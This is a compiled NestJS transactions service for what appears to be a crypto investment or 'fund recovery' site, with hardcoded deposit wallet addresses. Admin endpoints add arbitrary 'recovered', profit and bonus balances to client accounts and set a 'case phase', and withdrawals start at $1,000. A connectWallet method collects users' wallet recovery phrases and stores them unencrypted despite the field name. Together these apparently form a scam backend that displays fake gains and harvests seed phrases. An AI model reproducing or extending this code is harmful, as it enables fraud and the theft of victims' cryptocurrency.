"use strict";
var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.TransactionsService = void 0;
const common_1 = require("@nestjs/common");
const bcrypt = require("bcrypt");
const prisma_service_1 = require("../prisma/prisma.service");
let TransactionsService = class TransactionsService {
    constructor(prisma) {
        this.prisma = prisma;
    }
    async getAccountSummary(userId) {
        const balance = await this.prisma.userBalance.findUnique({ where: { userId } });
        const b = (balance ?? {});
        const total_balance = (Number(b.balance) || 0) +
            (Number(b.investmentBalance) || 0) +
            (Number(b.recoveredBalance) || 0) +
            (Number(b.profitBonus) || 0) +
            (Number(b.bonus) || 0) +
            (Number(b.referralBonus) || 0);
        return {
            balance: Number(b.balance ?? 0),
            total_deposit: Number(b.totalDeposit ?? 0),
            total_withdrawal: Number(b.totalWithdrawal ?? 0),
            total_profit: Number(b.profitBonus ?? 0),
            total_bonus: Number(b.bonus ?? 0),
            total_referral_bonus: Number(b.referralBonus ?? 0),
            recovered_balance: Number(b.recoveredBalance ?? 0),
            investment_balance: Number(b.investmentBalance ?? 0),
            profit_balance: Number(b.profitBonus ?? 0),
            bonus_balance: Number(b.bonus ?? 0),
            referral_balance: Number(b.referralBonus ?? 0),
            pending_balance: Number(b.pendingBalance ?? 0),
            withdrawal_balance: Number(b.balance ?? 0),
            total_balance,
        };
    }
    async getTransactions(userId) {
        const txs = await this.prisma.transaction.findMany({
            where: { userId },
            orderBy: { createdAt: 'desc' },
        });
        return txs.map(tx => ({
            id: tx.id,
            amount: Number(tx.amount),
            transaction_type: tx.transactionType,
            status: tx.status,
            payment_method: tx.paymentMethod,
            created_at: tx.createdAt,
        }));
    }
    async getUserDeposits(userId) {
        const deposits = await this.prisma.transaction.findMany({
            where: { userId, transactionType: 'deposit' },
            orderBy: { createdAt: 'desc' },
        });
        return {
            results: deposits.map(d => ({
                id: d.id,
                amount: Number(d.amount),
                payment_method: d.paymentMethod,
                status: d.status,
                created_at: d.createdAt,
                date: d.createdAt?.toISOString().split('T')[0],
            })),
        };
    }
    async getDepositAddresses() {
        const addresses = await this.prisma.depositAddress.findMany({ where: { isActive: true } });
        const result = {};
        for (const a of addresses) {
            result[a.currency] = a.address;
        }
        const btcAddr = result.btc || process.env.DEPOSIT_ADDRESS_BTC || '17mHPvhLr8zUjcHW6Ct8oRMBazEaRoqnZZ';
        const ethAddr = result.eth || process.env.DEPOSIT_ADDRESS_ETH || '0x01Cf020193D0bb473534739B18BFcad94aa9B9C5';
        const usdtErc20 = result.usdt_erc20 || process.env.DEPOSIT_ADDRESS_USDT_ERC20 || '0x01Cf020193D0bb473534739B18BFcad94aa9B9C5';
        const usdtTrc20 = result.usdt_trc20 || process.env.DEPOSIT_ADDRESS_USDT_TRC20 || 'TBCC31o8LurWrcAsGbjR9saF2PjTefusSn';
        const usdcAddr = result.usdc || process.env.DEPOSIT_ADDRESS_USDC || '0x01Cf020193D0bb473534739B18BFcad94aa9B9C5';
        return {
            "Bitcoin": btcAddr,
            "Ethereum": ethAddr,
            "USDT (ERC20)": usdtErc20,
            "USDT (TRC20)": usdtTrc20,
            "USDC (ERC20)": usdcAddr,
            "Bank Transfer": "Contact Support",
            btc: btcAddr,
            eth: ethAddr,
            usdt: usdtErc20,
        };
    }
    async getWithdrawalMethods() {
        const methods = await this.prisma.withdrawalMethod.findMany({ where: { isActive: true } });
        return methods.map(m => ({
            id: m.id,
            name: m.name,
            min: Number(m.minAmount),
            max: Number(m.maxAmount),
            charge: `${Number(m.feePercentage)}%`,
            duration: m.duration,
        }));
    }
    async deposit(userId, amount, paymentMethod, walletAddress, receipt) {
        const amt = parseFloat(amount);
        if (isNaN(amt) || amt <= 0)
            throw new common_1.BadRequestException('Amount must be greater than 0');
        let receiptUrl = null;
        if (receipt) {
            receiptUrl = `/media/receipts/${Date.now()}_${receipt.originalname}`;
        }
        await this.prisma.transaction.create({
            data: {
                userId,
                transactionType: 'deposit',
                amount: amt,
                paymentMethod,
                walletAddress,
                receiptUrl,
                status: 'pending',
            },
        });
        return { message: 'Deposit confirmed. Thank you!' };
    }
    async withdraw(userId, dto) {
        if (dto.amount < 1000)
            throw new common_1.BadRequestException('Minimum withdrawal is $1,000');
        const user = await this.prisma.user.findUnique({
            where: { id: userId },
            include: { balance: true },
        });
        if (!user)
            throw new common_1.NotFoundException('User not found');
        if (!user.pinHash)
            throw new common_1.BadRequestException('Please set a security PIN before withdrawing.');
        const pinValid = await bcrypt.compare(dto.pin, user.pinHash);
        if (!pinValid)
            throw new common_1.BadRequestException('Invalid PIN');
        const availableBalance = Number(user.balance?.balance ?? 0);
        if (dto.amount > availableBalance)
            throw new common_1.BadRequestException('Insufficient balance');
        await this.prisma.transaction.create({
            data: {
                userId,
                transactionType: 'withdrawal',
                amount: dto.amount,
                withdrawalMethod: dto.withdrawal_method,
                bankName: dto.bank_name,
                accountNumber: dto.account_number,
                routingNumber: dto.routing_number,
                walletAddress: dto.wallet_address,
                network: dto.network,
                fee: 0,
                status: 'pending',
            },
        });
        await this.prisma.userBalance.update({
            where: { userId },
            data: {
                balance: availableBalance - dto.amount,
                pendingBalance: Number(user.balance?.pendingBalance ?? 0) + dto.amount,
            },
        });
        return { message: 'Withdrawal request submitted successfully!' };
    }
    async transfer(userId, dto) {
        if (dto.amount <= 0)
            throw new common_1.BadRequestException('Amount must be greater than 0');
        const user = await this.prisma.user.findUnique({
            where: { id: userId },
            include: { balance: true },
        });
        if (!user)
            throw new common_1.NotFoundException('User not found');
        if (!user.pinHash)
            throw new common_1.BadRequestException('Please set a security PIN before transferring.');
        const pinValid = await bcrypt.compare(dto.pin, user.pinHash);
        if (!pinValid)
            throw new common_1.BadRequestException('Invalid PIN');
        const availableBalance = Number(user.balance?.balance ?? 0);
        if (dto.amount > availableBalance)
            throw new common_1.BadRequestException('Insufficient balance');
        const recipient = await this.prisma.user.findUnique({
            where: { email: dto.recipient_email.toLowerCase().trim() },
            include: { balance: true },
        });
        if (!recipient)
            throw new common_1.NotFoundException('Recipient not found');
        if (recipient.id === userId)
            throw new common_1.BadRequestException('Cannot transfer to yourself');
        await this.prisma.$transaction([
            this.prisma.transaction.create({
                data: {
                    userId,
                    transactionType: 'transfer',
                    amount: dto.amount,
                    recipientEmail: dto.recipient_email,
                    recipientUserId: recipient.id,
                    note: dto.note,
                    fee: 0,
                    status: 'completed',
                },
            }),
            this.prisma.userBalance.update({
                where: { userId },
                data: { balance: availableBalance - dto.amount },
            }),
            this.prisma.userBalance.update({
                where: { userId: recipient.id },
                data: { balance: Number(recipient.balance?.balance ?? 0) + dto.amount },
            }),
        ]);
        return { message: 'Transfer submitted successfully!' };
    }
    async getAdminDashboard() {
        const [totalUsers, totalTransactions, depositAgg] = await Promise.all([
            this.prisma.user.count(),
            this.prisma.transaction.count(),
            this.prisma.transaction.aggregate({
                _sum: { amount: true },
                where: { transactionType: 'deposit' },
            }),
        ]);
        return {
            total_users: totalUsers,
            total_transactions: totalTransactions,
            total_deposit_amount: Number(depositAgg._sum.amount ?? 0),
        };
    }
    async getTransactionList() {
        const transactions = await this.prisma.transaction.findMany({
            orderBy: { createdAt: 'desc' },
            include: {
                user: { select: { email: true, firstName: true, lastName: true } },
            },
        });
        const results = transactions.map((tx) => ({
            id: tx.id,
            amount: Number(tx.amount),
            transaction_type: tx.transactionType,
            status: tx.status,
            date: tx.createdAt,
            user: tx.user ? {
                email: tx.user.email,
                full_name: `${tx.user.firstName} ${tx.user.lastName}`.trim(),
                name: `${tx.user.firstName} ${tx.user.lastName}`.trim(),
            } : 'Unknown',
            receipt_url: tx.receiptUrl,
            payment_method: tx.paymentMethod,
        }));
        return { results };
    }
    async updateTransaction(dto) {
        const tx = await this.prisma.transaction.findUnique({ where: { id: dto.id } });
        if (!tx)
            throw new common_1.NotFoundException('Transaction not found');
        const newStatus = dto.status.toLowerCase();
        await this.prisma.transaction.update({
            where: { id: dto.id },
            data: { status: newStatus },
        });
        if (newStatus === 'approved' && tx.transactionType === 'deposit') {
            const balance = await this.prisma.userBalance.findUnique({ where: { userId: tx.userId } });
            await this.prisma.userBalance.update({
                where: { userId: tx.userId },
                data: {
                    balance: Number(balance?.balance ?? 0) + Number(tx.amount),
                    totalDeposit: Number(balance?.totalDeposit ?? 0) + Number(tx.amount),
                },
            });
        }
        if (newStatus === 'approved' && tx.transactionType === 'withdrawal') {
            const balance = await this.prisma.userBalance.findUnique({ where: { userId: tx.userId } });
            await this.prisma.userBalance.update({
                where: { userId: tx.userId },
                data: {
                    pendingBalance: Number(balance?.pendingBalance ?? 0) - (Number(tx.amount) - Number(tx.fee)),
                    totalWithdrawal: Number(balance?.totalWithdrawal ?? 0) + Number(tx.amount),
                },
            });
        }
        if (newStatus === 'declined' && tx.transactionType === 'withdrawal') {
            const balance = await this.prisma.userBalance.findUnique({ where: { userId: tx.userId } });
            await this.prisma.userBalance.update({
                where: { userId: tx.userId },
                data: {
                    balance: Number(balance?.balance ?? 0) + Number(tx.amount),
                    pendingBalance: Number(balance?.pendingBalance ?? 0) - (Number(tx.amount) - Number(tx.fee)),
                },
            });
        }
        return { message: `Transaction ${newStatus} successfully` };
    }
    async getAdminSettings() {
        const configs = await this.prisma.systemConfig.findMany();
        const result = {};
        for (const c of configs) {
            result[c.key] = c.value;
        }
        return result;
    }
    async updateAdminSettings(dto) {
        const updates = [];
        if (dto.email !== undefined) {
            updates.push(this.prisma.systemConfig.upsert({
                where: { key: 'admin_email' },
                update: { value: dto.email },
                create: { key: 'admin_email', value: dto.email },
            }));
        }
        if (dto.transaction_limit !== undefined) {
            updates.push(this.prisma.systemConfig.upsert({
                where: { key: 'transaction_limit' },
                update: { value: String(dto.transaction_limit) },
                create: { key: 'transaction_limit', value: String(dto.transaction_limit) },
            }));
        }
        if (dto.status !== undefined) {
            updates.push(this.prisma.systemConfig.upsert({
                where: { key: 'system_status' },
                update: { value: dto.status },
                create: { key: 'system_status', value: dto.status },
            }));
        }
        await Promise.all(updates);
        return { message: 'Settings updated successfully!' };
    }
    async updateClient(dto) {
        const user = await this.prisma.user.findUnique({ where: { id: dto.client_id } });
        if (!user)
            throw new common_1.NotFoundException('User not found');
        const current = await this.prisma.userBalance.findUnique({ where: { userId: dto.client_id } });
        const balanceData = {};
        if (dto.recovered_balance !== undefined)
            balanceData.recoveredBalance = Number(current?.recoveredBalance ?? 0) + dto.recovered_balance;
        if (dto.total_deposit !== undefined)
            balanceData.totalDeposit = Number(current?.totalDeposit ?? 0) + dto.total_deposit;
        if (dto.bonus !== undefined)
            balanceData.bonus = Number(current?.bonus ?? 0) + dto.bonus;
        if (dto.referal_bonus !== undefined)
            balanceData.referralBonus = Number(current?.referralBonus ?? 0) + dto.referal_bonus;
        if (dto.profit_bonus !== undefined)
            balanceData.profitBonus = Number(current?.profitBonus ?? 0) + dto.profit_bonus;
        if (dto.investment_balance !== undefined)
            balanceData.investmentBalance = Number(current?.investmentBalance ?? 0) + dto.investment_balance;
        if (Object.keys(balanceData).length > 0) {
            await this.prisma.userBalance.update({ where: { userId: dto.client_id }, data: balanceData });
        }
        if (dto.case_phase !== undefined) {
            await this.prisma.user.update({
                where: { id: dto.client_id },
                data: { casePhase: dto.case_phase },
            });
        }
        return { message: 'Client details updated successfully!' };
    }
    async createInvestment(userId, dto) {
        const plan = await this.prisma.investmentPlan.findUnique({ where: { slug: dto.plan } });
        if (!plan)
            throw new common_1.NotFoundException('Investment plan not found');
        await this.prisma.investment.create({
            data: {
                userId,
                planId: plan.id,
                amount: dto.amount,
                paymentMethod: dto.paymentMethod,
                status: 'active',
            },
        });
        return { message: 'Case initiated successfully!' };
    }
    async connectWallet(userId, dto) {
        await this.prisma.walletConnection.create({
            data: {
                userId,
                walletType: dto.walletType,
                encryptedPhraseKey: dto.phraseKey,
            },
        });
        return { message: 'Wallet connected successfully!' };
    }
};
exports.TransactionsService = TransactionsService;
exports.TransactionsService = TransactionsService = __decorate([
    (0, common_1.Injectable)(),
    __metadata("design:paramtypes", [prisma_service_1.PrismaService])
], TransactionsService);
//# sourceMappingURL=transactions.service.js.map